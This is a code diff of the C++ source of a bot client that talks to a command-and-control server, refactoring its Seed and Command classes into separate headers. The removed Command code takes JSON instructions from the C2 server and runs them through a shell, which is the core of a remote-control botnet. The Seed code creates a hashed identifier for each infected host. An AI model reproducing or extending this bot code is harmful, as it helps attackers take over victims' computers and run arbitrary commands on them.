@@ -1,15 +1,10 @@
-#include <fstream>
 #include <memory>
-#include <random>
 #include <string>
-#include <tuple>
 
+#include "command.hh"
 #include "constants.hh"
-#include "picosha2.h"
-#include "rapidjson/document.h"
-#include "rapidjson/stringbuffer.h"
-#include "rapidjson/writer.h"
 #include "request.hh"
+#include "seed.hh"
 #include "system.hh"
 
 class C2Server {
@@ -24,30 +19,6 @@ class C2Server {
 
    private:
     std::string _registerUrl, _cmdUrl;
-};
-
-class Seed {
-   public:
-    Seed(const std::string& filePath) { _path = filePath; }
-    bool exists();
-    void initSeed();
-    void getSeed();
-    std::string getHash() { return _hash; }
-
-   private:
-    std::string _path, _hash;
-
-    void calcHash(const std::string&);
-    void calcHash(std::ifstream&);
-};
-
-class Command {
-   public:
-    Command(std::string& c2Response);
-    std::string execute();
-
-    std::string commandText;
-    std::string shell;
 };
 
 class Bot {
@@ -127,87 +98,4 @@ void Bot::_prepareSysInfo() {
     if (!(_user.size())) {
         _user = util::getUser();
     }
-}
-
-// Define Seed member functions
-
-bool Seed::exists() {
-    std::ifstream inFile(_path);
-    return (inFile.good());
-}
-
-std::string genSeedData(int rngNumIter) {
-    // Use <random> header for portability
-    std::string seedData;
-    std::random_device randomDev;
-    std::mt19937 randNum(randomDev());
-    for (int i = 0; i < rngNumIter; ++i) {
-        seedData.push_back((char)randNum());
-    }
-
-    return seedData;
-}
-
-void Seed::initSeed() {
-    std::string seedData;
-    std::ofstream seedFile(_path, std::ios::binary | std::ios::trunc);
-    if (seedFile.is_open()) {
-        seedData = genSeedData(SEED_RNG_ITERATIONS);
-        seedFile << seedData;
-    }
-
-    calcHash(seedData);
-}
-
-void Seed::getSeed() {
-    if (exists()) {
-        std::ifstream seedFile(_path, std::ios::binary);
-        if (seedFile.is_open()) calcHash(seedFile);
-    }
-}
-
-void Seed::calcHash(const std::string& str) {
-    _hash = picosha2::hash256_hex_string(str);
-}
-
-void Seed::calcHash(std::ifstream& seedFile) {
-    // This method may use less memory than getting hex_str from string
-    std::vector<unsigned char> hash(32);
-    picosha2::hash256(std::istreambuf_iterator<char>(seedFile),
-                      std::istreambuf_iterator<char>(), hash.begin(),
-                      hash.end());
-    _hash = picosha2::bytes_to_hex_string(hash.begin(), hash.end());
-}
-
-// Define Command member functions
-Command::Command(std::string& c2Response) {
-    // Parse into something resembling a nested unordered map
-    rapidjson::Document json;
-    json.Parse(c2Response.c_str());
-
-    if (json.IsObject()) {
-        commandText = json["command_text"].IsString()
-                          ? json["command_text"].GetString()
-                          : "";
-        shell =
-            json["shell"].IsString() ? json["shell"].GetString() : "default";
-    } else {
-        shell = "default";
-    }
-}
-
-std::string Command::execute() {
-    /* Add necessary syntax before and after command
-     * depending on shell choice */
-    std::string stringToExecute;
-
-    if (shell == "default") {
-        stringToExecute = commandText;
-    } else {
-        std::string preText, postText;
-        std::tie(preText, postText) = SHELL_SYNTAX_LIST.at(shell.c_str());
-        stringToExecute = preText + commandText + postText;
-    }
-
-    return util::popenSubprocess(stringToExecute.c_str());
 }
